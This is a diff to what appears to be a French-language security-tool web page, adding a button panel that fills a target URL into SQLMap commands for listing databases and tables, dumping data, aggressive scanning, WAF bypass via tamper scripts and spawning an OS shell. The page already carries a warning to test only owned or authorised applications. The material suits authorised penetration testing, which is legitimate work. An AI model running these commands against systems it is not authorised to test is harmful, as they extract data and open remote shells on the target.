@@ -39,6 +39,43 @@
     </div>
   </div>
 
+  <!-- QUICK ACTIONS -->
+  <div class="quick-actions">
+    <div class="quick-actions-header">
+      <span class="qa-icon">⚡</span>
+      <h3>Actions rapides — SQLMap</h3>
+    </div>
+    <div class="qa-target-row">
+      <span class="qa-target-label">URL cible :</span>
+      <input type="text" class="qa-target-input" placeholder="http://target.com/page?id=1">
+    </div>
+    <div class="qa-buttons">
+      <button class="qa-btn" data-icon="🔍" data-cmd="sqlmap -u '{TARGET}' --dbs">
+        <span class="qa-btn-icon">🔍</span> Lister les DBs
+      </button>
+      <button class="qa-btn" data-icon="📋" data-cmd="sqlmap -u '{TARGET}' --tables">
+        <span class="qa-btn-icon">📋</span> Lister les tables
+      </button>
+      <button class="qa-btn" data-icon="💾" data-cmd="sqlmap -u '{TARGET}' --dump">
+        <span class="qa-btn-icon">💾</span> Dump données
+      </button>
+      <button class="qa-btn" data-icon="🚀" data-cmd="sqlmap -u '{TARGET}' --level=5 --risk=3 --batch">
+        <span class="qa-btn-icon">🚀</span> Scan agressif
+      </button>
+      <button class="qa-btn" data-icon="🛡️" data-cmd="sqlmap -u '{TARGET}' --tamper=space2comment --random-agent">
+        <span class="qa-btn-icon">🛡️</span> Bypass WAF
+      </button>
+      <button class="qa-btn" data-icon="🐚" data-cmd="sqlmap -u '{TARGET}' --os-shell">
+        <span class="qa-btn-icon">🐚</span> OS Shell
+      </button>
+    </div>
+    <div class="qa-result-row">
+      <span class="qa-result-label">Cmd :</span>
+      <div class="qa-result-cmd"></div>
+      <button class="qa-copy-result">⎘ Copier</button>
+    </div>
+  </div>
+
   <div class="info-box warning">
     <span class="info-box-icon">⚠️</span>
     <div class="info-box-text">Utilisez SQLMap uniquement sur des applications web dont vous êtes propriétaire ou pour lesquelles vous avez une autorisation écrite explicite.</div>
